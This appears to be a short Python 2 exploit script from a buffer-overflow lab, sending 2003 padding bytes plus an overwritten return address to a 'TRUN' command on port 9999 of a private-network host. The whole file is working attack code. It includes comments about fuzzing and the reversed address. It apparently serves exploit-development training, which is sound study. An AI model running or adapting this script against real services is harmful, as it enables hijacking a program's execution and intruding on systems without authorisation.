#!/usr/bin/python

import sys, socket

# reveresed 625011af

shellcode = "A" * 2003+ "\xaf\x11\x50\x62" 
try:
	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
	s.connect(('192.168.1.213',9999))
		#previously determined trun was a vulnerable command
	s.send(('TRUN /.:/' + shellcode))
	s.close()


except:
#		print "Fuzzing crashed at %s bytes" % str(len(buffer))
	print "Error connecting to server"
	sys.exit()

